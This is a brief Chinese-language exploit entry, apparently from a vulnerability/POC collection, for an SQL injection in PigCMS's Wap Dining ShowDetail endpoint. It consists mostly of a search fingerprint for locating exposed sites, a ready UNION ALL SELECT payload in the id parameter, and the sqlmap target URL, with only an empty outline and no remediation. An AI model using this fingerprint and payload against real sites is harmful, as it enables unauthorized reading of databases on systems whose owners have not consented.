# PigCMSShowDetailSQL注入漏洞

- **系统**：PigCMSShowDetailSQL　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.body="/tpl/Home/pigcms/common/js/daohang.js"`

**请求体 / payload**
```
/index.php?g=Wap&m=Dining&a=ShowDetail&id=3 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a717071,0x56416e6e6d4b697077546c6c5057524c687776654847535a6c4c4e4475584b61556f42664d616947,0x717a717871),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
sqlmap
/index.php?g=Wap&m=Dining&a=ShowDetail&id=3
```

**其他**
- PigCMS ShowDetail SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * PigCMS